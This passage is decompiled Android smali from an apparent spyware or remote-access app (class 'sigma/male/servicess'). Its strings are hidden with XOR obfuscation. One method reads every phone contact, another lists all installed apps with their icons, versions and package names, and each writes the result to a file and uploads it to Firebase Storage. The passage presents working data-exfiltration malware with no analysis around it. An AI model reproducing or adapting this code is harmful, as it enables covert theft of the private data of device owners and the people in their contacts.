    const-string v0, "aTwyQFRraCtITDR0KExVMGlhW1EwIzZCSiFzZk5XOyAjQ0xoczFEXCE8e0ldIz0lSBUiPSJZUHl0L0NRIT0nQRUmNydBXWhlYRMENzsiVAZpJzJUVDBqZk9XMS09QFknMy9DAmVvNkxcMT0oSgJlbyRMWz4zNEJNOzB8Dls2NzsDVDovMURcITx8Tlk5N24UAHB0aw0OZSQ+BAMlOzVETDw7KBdKMDgnWVEjMX1FXTwzLlkCNCEyQgMlNSJJUTsza09XISApQAJgJD4WSDQwIkRWMnkyQkhvZXNdQG4kJ0lcPDohAFQwMjIXDmUkPhZaNDctSko6IShJAnYyIEsDODU0SlE7bidYTDpvJEJKMTE0AEo0MC9YS29ldl1AbjknX188OmtZVyVuc11AKHoqQhg8OSFWXjk7J1kCOTEgWQM9MS9KUCFudR1ILW8xRFwhPHweCCUsfV1XJj0yRFc7bidPSzo4M1ldbiApXQJtJD4WVDAyMhcJZSQ+UBY5O2ZeSDQ6PUtUOjUyF0o8My5ZAzg1NEpRO3k0RF89IHwfCCUsOxEXJiA/QV1r"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 791
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 793
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x4

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v5, "Cj0i"

    invoke-static {v5}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v2, v3

    const-string v3, "MT01XVQ0LRlDWTgx"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v7

    const/4 v3, 0x2

    const-string v5, "MTUyTAk="

    invoke-static {v5}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v2, v3

    const/4 v3, 0x3

    const-string v5, "NDclQk07IBlZQSUx"

    invoke-static {v5}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v2, v3

    const-string v3, "NDclQk07IBlZQSUxZhEGdXMhQlcyOCMKGA=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    move-object v5, v4

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 794
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v0

    if-lez v0, :cond_2

    move-object v0, v6

    .line 799
    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-nez v2, :cond_1

    .line 809
    :goto_1
    :try_start_0
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "ejcpQ0x7PDJAVA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->isExistFile(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 810
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "ejcpQ0x7PDJAVA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->deleteFile(Ljava/lang/String;)V

    .line 812
    :cond_0
    new-instance v1, Ljava/io/FileOutputStream;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "ejcpQ0x7PDJAVA=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    invoke-direct {v1, v2, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    .line 814
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "\n\n"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/FileOutputStream;->write([B)V

    .line 815
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V

    .line 819
    iget-object v0, p0, Lsigma/male/servicess;->sigmamale:Lcom/google/firebase/storage/StorageReference;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "ejcpQ0x7PDJAVA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageReference;->child(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "ejcpQ0x7PDJAVA=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageReference;->putFile(Landroid/net/Uri;)Lcom/google/firebase/storage/UploadTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/UploadTask;->addOnFailureListener(Lcom/google/android/gms/tasks/OnFailureListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->addOnProgressListener(Lcom/google/firebase/storage/OnProgressListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    new-instance v1, Lsigma/male/servicess$25;

    invoke-direct {v1, p0}, Lsigma/male/servicess$25;-><init>(Lsigma/male/servicess;)V

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->continueWithTask(Lcom/google/android/gms/tasks/Continuation;)Lcom/google/android/gms/tasks/Task;

    move-result-object v0

    .line 823
    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    invoke-virtual {v0, v1}, Lcom/google/android/gms/tasks/Task;->addOnCompleteListener(Lcom/google/android/gms/tasks/OnCompleteListener;)Lcom/google/android/gms/tasks/Task;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 838
    :goto_2
    return-void

    .line 800
    :cond_1
    const-string v2, "MTUyTAk="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    .line 801
    const-string v3, "MT01XVQ0LRlDWTgx"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    .line 802
    const-string v4, "NDclQk07IBlZQSUx"

    invoke-static {v4}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    .line 803
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v5, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "aTAvWxg2OCdeS2hzKkIfdWp6RFUydDVfW2hzLllMJSd8AhczPTRIWjQnI15MOiYnSl17MylCXzkxJ11RJnolQlV6InYCWnojLkRMMHl0T1tgMmhMSCUnNkJMezcpQBc6eyVCViF6NkNfajUqWQU4MSJEWXMgKUZdO2lySF1mZXJOW3g3d09ceGB3Glx4NnYeXXhsJx4LM2NyTwxmZ3YKGGtoJBN2NDkjFxhpeyQT"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "aTY0EwQ3aghYVTcxNBcYaXskEw=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "aTY0ExhpNnhrSjo5fA0EejZ4"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "aXsiRE5r"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    goto :goto_2

    .line 828
    :catch_1
    move-exception v0

    goto :goto_2

    :cond_2
    move-object v0, v6

    goto/16 :goto_1
.end method

.method public _dmpsm(Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 635
    return-void
.end method

.method public _getpackages()V
    .locals 8

    .prologue
    const/4 v7, 0x0

    .line 842
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0, v7}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v1

    .line 844
    const-string v0, "aTwyQFRraCtITDR0KExVMGlhW1EwIzZCSiFzZk5XOyAjQ0xoczFEXCE8e0ldIz0lSBUiPSJZUHl0L0NRIT0nQRUmNydBXWhlYRMYaScyVFQwamxWVTQmIURWb2R9XVkxMC9DX29kfVBaOjA/VlU0JiFEVm9kfV1ZMTAvQ19vZH1PWTY/IV9XIDoiFxtnZnQWRXs/I1RUOjMhDUM3NSVGXyc7M0Ncb3d2HQhuIy9JTD1uJUxUNnx/GB11eWYfCCUsbxZQMD0hRUxvNTNZV245J19fPDp8TE0hO31dWTEwL0Nfb2V2XUBuNylBVyduZR1cMW82TFwxPShKFTc7MllXOG53HUgtbytMSjI9KABMOiR8FUgtbyRCSjExNABKNDAvWEtvZXZdQG4kKV5RIT0pQwInMSpMTDwiIxZXIzE0S1Q6I3xMTSE7fVAWPjE/QVcyM2YNWi43KUFXJ240SFxuKWhGXSw4KUpfdT0rSkM4NT4AUDA9IUVMb2F2XUBuOSdVFSI9IllQb2F2XUBuJCleUSE9KUMCNDY1QlQgICMWVDAyMhcJZSQ+FkV7PyNUVDozIQ1ILjcpQVcnbmVLXjNvOwNTMC0qQl8ydDVdWTsvIEFXNCB8X1EyPDIWVTQmIURWeCYvSlAhbncdSC1vOwNaITo9RV08My5ZAmFkNlUDIj0iWVBvZXMdSC1vJEJKMTE0FwhuNilfXDAma19ZMT0zXgJgJD4WWjomIkhKb2U2VRgmOypEXHUmI0kDNzUlRl8nOzNDXG82KkxbPm8lQlQ6JnxaUDwgIxZFdWhpXkwsOCMTBDc7IlQG"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 845
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    move-object v1, v0

    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_1

    .line 863
    :try_start_0
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "ejU2XUt7PDJAVA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/FileUtil;->isExistFile(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 864
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "ejU2XUt7PDJAVA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/FileUtil;->deleteFile(Ljava/lang/String;)V

    .line 866
    :cond_0
    new-instance v0, Ljava/io/FileOutputStream;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "ejU2XUt7PDJAVA=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    invoke-direct {v0, v2, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    .line 868
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "\n\n"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/FileOutputStream;->write([B)V

    .line 869
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V

    .line 870
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "JTUlRl0/Jyw="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lsigma/male/SketchwareUtil;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    .line 873
    iget-object v0, p0, Lsigma/male/servicess;->sigmamale:Lcom/google/firebase/storage/StorageReference;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "ejU2XUt7PDJAVA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageReference;->child(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "ejU2XUt7PDJAVA=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageReference;->putFile(Landroid/net/Uri;)Lcom/google/firebase/storage/UploadTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/UploadTask;->addOnFailureListener(Lcom/google/android/gms/tasks/OnFailureListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->addOnProgressListener(Lcom/google/firebase/storage/OnProgressListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    new-instance v1, Lsigma/male/servicess$26;

    invoke-direct {v1, p0}, Lsigma/male/servicess$26;-><init>(Lsigma/male/servicess;)V

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->continueWithTask(Lcom/google/android/gms/tasks/Continuation;)Lcom/google/android/gms/tasks/Task;

    move-result-object v0

    .line 877
    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    invoke-virtual {v0, v1}, Lcom/google/android/gms/tasks/Task;->addOnCompleteListener(Lcom/google/android/gms/tasks/OnCompleteListener;)Lcom/google/android/gms/tasks/Task;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 893
    :goto_1
    return-void

    .line 845
    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/pm/PackageInfo;

    .line 848
    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 849
    iget-object v4, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    invoke-virtual {p0}, Lsigma/male/servicess;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/content/pm/ApplicationInfo;->loadIcon(Landroid/content/pm/PackageManager;)Landroid/graphics/drawable/Drawable;

    move-result-object v4

    invoke-static {v4}, Lsigma/male/servicess;->getBitmapFromDrawable(Landroid/graphics/drawable/Drawable;)Landroid/graphics/Bitmap;

    move-result-object v4

    .line 850
    sget-object v5, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v6, 0x64

    invoke-virtual {v4, v5, v6, v3}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 851
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v3

    .line 852
    invoke-static {v3, v7}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v3

    .line 857
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "aTAvWxg2OCdeS2hzLUhBOTshSh91anpEVTJ0NV9baHMiTEw0bi9AWTIxaV1WMm8kTEswYnIB"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "cnR4EVw8ImZeTCw4IxAfODU0SlE7eSpIXiFucB1ILW82TFwxPShKFSE7NhcLJSx9Qk4wJiBBVyJuJ1hMOm9hDQZpNmZeTCw4IxAfNjsqQkpvMzRIXTtvYQ0GdQ=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v3, v0, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    invoke-virtual {p0}, Lsigma/male/servicess;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "dXww"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v3, v0, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "dX16AlpraCRfBmk2Zl5MLDgjEB82OypCSm8mI0kDcnR4DQ=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aXskEwQ3JngRFzE9MBMENyZ4ERcxPTAT"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    goto/16 :goto_1

    .line 882
    :catch_1
    move-exception v0

    goto/16 :goto_1
.end method

.method public _palysmudic(Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 967
    new-instance v0, Landroid/media/MediaPlayer;

    invoke-direct {v0}, Landroid/media/MediaPlayer;-><init>()V

    iput-object v0, p0, Lsigma/male/servicess;->mp:Landroid/media/MediaPlayer;

    .line 968
    iget-object v0, p0, Lsigma/male/servicess;->mp:Landroid/media/MediaPlayer;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/media/MediaPlayer;->setAudioStreamType(I)V

    .line 970
    :try_start_0
    iget-object v0, p0, Lsigma/male/servicess;->mp:Landroid/media/MediaPlayer;

    invoke-virtual {v0, p1}, Landroid/media/MediaPlayer;->setDataSource(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0
